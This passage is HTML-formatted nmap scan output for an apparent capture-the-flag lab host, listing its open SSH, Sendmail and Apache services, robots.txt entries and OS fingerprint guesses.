&lt;span class="code-line"&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;OpenSSH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;hostkey&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nl"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;f8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;e0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;72&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b5&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;a4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;93&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;aa&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="nl"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ef&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;e7&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;70&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;d3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;81&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;b8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nl"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;ae&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nl"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;ea&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nl"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;b4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RSA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Sendmail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.13.5&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;8.13.5&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;commands&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ctf4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sas&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upenn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;edu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Hello&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;192.168.1.97&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pleased&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;meet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ENHANCEDSTATUSCODES&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PIPELINING&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;EXPN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERB&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;BITMIME&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SIZE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DSN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ETRN&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DELIVERBY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HELP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;This&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sendmail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;8.13.5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Topics&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HELO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;EHLO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MAIL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;RCPT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;DATA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;RSET&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;NOOP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;QUIT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HELP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VRFY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;EXPN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VERB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ETRN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DSN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;STARTTLS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;For&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;more&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;HELP &amp;lt;topic&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;To&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;report&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bugs&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;implementation&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sendmail&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bugs&lt;/span&gt;&lt;span class="nv"&gt;@sendmail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;For&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;information&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Postmaster&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;your&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HELP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.2.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Fedora&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_http&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;methods&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Allow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OPTIONS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;robots&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;disallowed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;entries&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restricted&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;sql&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_http&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Prof&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ehks&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;631&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;closed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ipp&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Aggressive&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;guesses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.16&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.21&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;98&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.13&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Control4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;300&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Lantronix&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SLC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;terminal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;96&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SNR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SNR&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;S2960&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;switch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;95&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SonicWALL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aventail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;EX&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;6000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VPN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;appliance&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dell&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;iDRAC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;access&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.6.32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;94&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
